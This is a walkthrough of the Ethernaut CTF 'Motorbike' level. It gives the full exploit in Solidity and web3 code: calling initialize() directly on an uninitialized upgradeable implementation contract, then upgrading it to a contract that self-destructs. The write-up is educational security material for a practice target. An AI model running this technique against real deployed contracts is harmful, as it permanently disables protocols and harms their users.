# Ethernaut Level 26 (Motorbike) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 26. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

The goal is the make the implementation contract (Engine), selfdestruct. The nature of this exploit is not so much siphoning funds, but making the protocol unusable and unsalvageable after the exploit.

This exploit arose because of a vulnerability in theOpenZeppelin upgradeability contracts, specifically the Initializable contract. Nothing stopped someone from calling the implementation contract directly, instead of through the proxy, and call `initialize()` (since implementation inherits the Initializable contract), which made him the upgrader of the contract. Then, the exploiter could make a new implementation contract which selfdestructs, and since the implementation contract makes a delegate call to this new implementation, selfdestruct is called in its own context, thereby destroying it, and with it all hopes of salvaging or upgrading the contract to a fixed version.

The solution, thus, involved these exact steps.

#### Solution

1.  Create the new implementation contract with self destruct functionality:

```
contract Attack {
    function end() public {
        selfdestruct(payable(0));
    }
}
```

2.  Call the initialize() function on the implementation contract directly.

- Get the current implementation contract's address from the implementation slot:
    - `await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")`
        The returned value will be 32 bytes, out of which the right most 20 bytes will be the address. Tease that out and append 0x to its left. We get `0x44028acee7d63cddb5c2433ac342702f158f93f3`
- Encode the function signature of the `initialize()` function: `let initializeCall = web3.eth.abi.encodeFunctionSignature("initialize()")`
- Send a transaction to the implementation contract, calling this function: `await web3.eth.sendTransaction({from: player, to: implAddr, data: initializeCall})`

You are now the initializer and thus the upgrader of the implementation contract. Now, to make the upgrade and end call.

3.  Encode the function signature of the `end()` function in our Attack contract, we will call this function in the same transaction in which we change to the new implementation (Attack contract).
    - `let endCall = web3.eth.abi.encodeFunctionSignature("end()")`

- Encode the function call to the `upgradeToAndCall()` function.
    
    ```
    callStr = web3.eth.abi.encodeFunctionCall({
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'newImplementation'
    },{
        type: 'bytes',
        name: 'data'
    }]}, [AttackContractAddr,endCall]);
    ```
    
- Send the transaction with the above function call:
    `await web3.eth.sendTransaction({from: player, to: implAddr, data: callStr})`
    

Success! You have self-destructed the implementation contract!
